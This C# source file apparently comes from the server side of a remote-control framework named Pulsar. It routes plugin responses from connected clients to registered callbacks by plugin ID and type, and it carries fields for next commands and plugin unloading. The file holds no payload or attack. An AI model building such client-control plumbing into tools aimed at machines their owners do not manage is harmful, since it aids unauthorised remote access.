using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Text;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using Pulsar.Server.Networking;

namespace Pulsar.Server.Messages
{
    public sealed class UniversalPluginResponseHandler : IMessageProcessor
    {
        private static readonly ConcurrentDictionary<string, Action<PluginResponse>> _callbacks = new ConcurrentDictionary<string, Action<PluginResponse>>();
        private static readonly ConcurrentDictionary<string, List<Action<PluginResponse>>> _typeHandlers = new ConcurrentDictionary<string, List<Action<PluginResponse>>>();
        
        public static event Action<PluginResponse> ResponseReceived;

        public bool CanExecute(IMessage message) => message is DoUniversalPluginResponse;
        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            if (!(message is DoUniversalPluginResponse response) || !(sender is Client client)) return;

            var result = new PluginResponse
            {
                Client = client,
                PluginId = response.PluginId,
                Command = response.Command,
                Success = response.Success,
                Message = response.Message,
                Data = response.Data,
                ShouldUnload = response.ShouldUnload,
                NextCommand = response.NextCommand
            };

            ResponseReceived?.Invoke(result);

            if (_callbacks.TryRemove(response.PluginId, out var callback))
            {
                try { callback(result); } catch { }
            }

            var pluginType = GetPluginType(response.PluginId);
            if (!string.IsNullOrEmpty(pluginType) && _typeHandlers.TryGetValue(pluginType, out var handlers))
            {
                foreach (var handler in handlers)
                {
                    try { handler(result); } catch { }
                }
            }
        }

        private string GetPluginType(string pluginId)
        {
            if (string.IsNullOrEmpty(pluginId)) return null;
            var idx = pluginId.IndexOf('_');
            return idx > 0 ? pluginId.Substring(0, idx) : null;
        }

        public static void Register(string pluginId, Action<PluginResponse> callback)
        {
            if (string.IsNullOrEmpty(pluginId) || callback == null) return;
            _callbacks[pluginId] = callback;
        }

        public static void RegisterType(string pluginType, Action<PluginResponse> callback)
        {
            if (string.IsNullOrEmpty(pluginType) || callback == null) return;
            _typeHandlers.AddOrUpdate(pluginType, 
                new List<Action<PluginResponse>> { callback },
                (k, v) => { v.Add(callback); return v; });
        }

        public static void Unregister(string pluginId)
        {
            _callbacks.TryRemove(pluginId, out _);
        }

        public static void UnregisterType(string pluginType, Action<PluginResponse> callback)
        {
            if (_typeHandlers.TryGetValue(pluginType, out var handlers))
            {
                handlers.Remove(callback);
                if (handlers.Count == 0) _typeHandlers.TryRemove(pluginType, out _);
            }
        }

        public static void Clear()
        {
            _callbacks.Clear();
            _typeHandlers.Clear();
        }
    }

    public class PluginResponse
    {
        public Client Client { get; set; }
        public string PluginId { get; set; }
        public string Command { get; set; }
        public bool Success { get; set; }
        public string Message { get; set; }
        public byte[] Data { get; set; }
        public bool ShouldUnload { get; set; }
        public string NextCommand { get; set; }

        public string GetText()
        {
            return Data != null ? Encoding.UTF8.GetString(Data) : string.Empty;
        }
    }
}
